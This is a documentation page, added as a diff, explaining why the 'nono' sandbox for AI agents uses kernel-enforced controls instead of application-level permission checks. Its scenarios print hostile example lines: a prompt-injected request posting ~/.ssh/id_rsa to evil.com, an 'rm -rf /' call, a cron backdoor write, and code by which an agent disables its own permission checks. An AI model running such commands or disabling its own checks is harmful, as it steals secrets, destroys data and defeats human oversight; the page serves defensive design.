@@ -1,0 +1,224 @@
+# Why OS-Level Controls
+
+nono uses kernel-enforced sandboxing instead of application-level controls. This page explains why this architectural choice provides fundamentally stronger security guarantees.
+
+## The Problem with Application-Level Controls
+
+Many AI agent frameworks implement their own permission systems:
+
+```python
+# Hypothetical application-level control
+agent.configure(
+    allowed_paths=["/home/user/project"],
+    allow_network=False
+)
+agent.run()
+```
+
+This approach has a fatal flaw: **the agent can bypass it**.
+
+### Why Application Controls Fail
+
+1. **The agent controls the runtime**
+   - The agent can modify its own code
+   - It can call system APIs directly
+   - It can ignore the permission checks entirely
+
+2. **No enforcement boundary**
+   - Application controls are just code running in the same process
+   - A compromised or malicious agent has full access to everything
+
+3. **Single point of failure**
+   - One bug in the permission system = complete bypass
+   - The agent can probe for and exploit these bugs
+
+## How OS-Level Enforcement Differs
+
+```
+Application-Level:
+┌─────────────────────────────────────┐
+│          Same Process               │
+│  ┌──────────┐    ┌──────────┐       │
+│  │ Controls ├────► Agent    │       │
+│  │ (code)   │    │ (code)   │       │
+│  └──────────┘    └──────────┘       │
+│         Agent can bypass            │
+└─────────────────────────────────────┘
+
+OS-Level (nono):
+┌─────────────────────────────────────┐
+│           Kernel Space              │
+│  ┌──────────────────────────────┐   │
+│  │    Landlock / Seatbelt       │   │
+│  │    (enforced by kernel)      │   │
+│  └──────────────────────────────┘   │
+└─────────────────────────────────────┘
+              ▲ blocks
+┌─────────────────────────────────────┐
+│           User Space                │
+│  ┌──────────────────────────────┐   │
+│  │         Agent Process        │   │
+│  │    (cannot escape sandbox)   │   │
+│  └──────────────────────────────┘   │
+└─────────────────────────────────────┘
+```
+
+## Key Differences
+
+### 1. Irreversibility
+
+**Application controls:** Can be modified or disabled at runtime
+
+```python
+# Agent can do this
+agent._permission_check = lambda *args: True
+os.system("rm -rf /")  # Bypasses application controls entirely
+```
+
+**OS-level (nono):** Cannot be modified after application
+
+```c
+// After sandbox_init() or landlock_restrict_self()
+// There is NO API to undo this
+// The kernel will block unauthorized access forever
+```
+
+### 2. Enforcement Authority
+
+**Application controls:** Enforced by code the agent can modify
+
+**OS-level (nono):** Enforced by the kernel
+- Agent cannot modify kernel code (without a kernel exploit)
+- System calls are intercepted before they can succeed
+- The agent never gains unauthorized access, even momentarily
+
+### 3. Process Inheritance
+
+**Application controls:** Child processes may not inherit restrictions
+
+```python
+# Parent has controls, but...
+subprocess.run("unrestricted-child")  # Child may have full access
+```
+
+**OS-level (nono):** All child processes inherit restrictions
+
+```bash
+# Parent is sandboxed
+# Child inherits ALL restrictions automatically
+# No way to spawn an unrestricted subprocess
+```
+
+### 4. Attack Surface
+
+**Application controls:** Every permission check is an attack vector
+
+```python
+def check_path_allowed(path):
+    # Bug: doesn't handle symlinks properly
+    # Bug: Unicode normalization bypass
+    # Bug: TOCTOU race condition
+    return path.startswith(allowed_prefix)
+```
+
+**OS-level (nono):** Kernel implementation is battle-tested
+- Landlock and Seatbelt handle edge cases
+- Symlink resolution is done correctly
+- TOCTOU windows are minimized or eliminated
+- Implemented by kernel security experts
+
+## Comparison Table
+
+| Property | Application-Level | OS-Level (nono) |
+|----------|-------------------|-----------------|
+| Enforced by | Application code | Kernel |
+| Can be bypassed by agent | Yes | No* |
+| Child process inheritance | Inconsistent | Guaranteed |
+| Irreversible | No | Yes |
+| Handles symlinks correctly | Maybe | Yes |
+| Prevents direct syscalls | No | Yes |
+| Attack surface | Large | Minimal |
+
+\* Requires kernel exploit to bypass
+
+## Real-World Implications
+
+### Scenario: Malicious Dependency
+
+Your agent loads a compromised npm package:
+
+**With application controls:**
+```javascript
+// Malicious package bypasses controls
+const fs = require('fs');
+fs.writeFileSync('/etc/cron.d/backdoor', '...');  // Works!
+```
+
+**With nono:**
+```javascript
+// Same malicious code
+const fs = require('fs');
+fs.writeFileSync('/etc/cron.d/backdoor', '...');
+// EPERM: Operation not permitted (kernel blocks it)
+```
+
+### Scenario: Prompt Injection
+
+An agent is tricked via prompt injection to exfiltrate secrets:
+
+**With application controls:**
+```python
+# Injected command
+requests.post("https://evil.com", data=open("/home/user/.ssh/id_rsa").read())
+# Application controls? Agent just ignores them
+```
+
+**With nono:**
+```python
+# Same injected command
+requests.post("https://evil.com", data=open("/home/user/.ssh/id_rsa").read())
+# Two failures:
+# 1. Cannot read ~/.ssh (blocked path)
+# 2. Cannot make network request (if --net-allow not specified)
+```
+
+### Scenario: Agent Self-Modification
+
+Agent tries to remove its own restrictions:
+
+**With application controls:**
+```python
+# Agent disables its own checks
+import sys
+sys.modules['permission_checker'] = type(sys)('fake')
+# Now all permission checks return True
+```
+
+**With nono:**
+```python
+# Agent cannot modify kernel sandbox
+# There is literally no code to patch
+# The sandbox is part of the process's security context in the kernel
+```
+
+## When Application Controls Are Acceptable
+
+Application-level controls still have uses:
+
+1. **UX improvement** - Provide helpful error messages before hitting kernel denial
+2. **Auditing** - Log what the agent *intended* to do
+3. **Rate limiting** - Throttle API calls (not a security boundary)
+4. **Defense in depth** - Additional layer on top of OS controls
+
+But they should **never** be the primary security boundary for untrusted code.
+
+## Summary
+
+| Approach | Trust Model | Security Guarantee |
+|----------|-------------|-------------------|
+| Application controls | Trust the agent to follow rules | None (agent can bypass) |
+| OS-level sandbox | Trust the kernel only | Strong (kernel-enforced) |
+
+nono chooses OS-level enforcement because **the agent is untrusted by definition**. Any security model that relies on the agent cooperating with restrictions is fundamentally broken.
+
+The kernel doesn't care what the agent wants. It enforces the rules regardless.
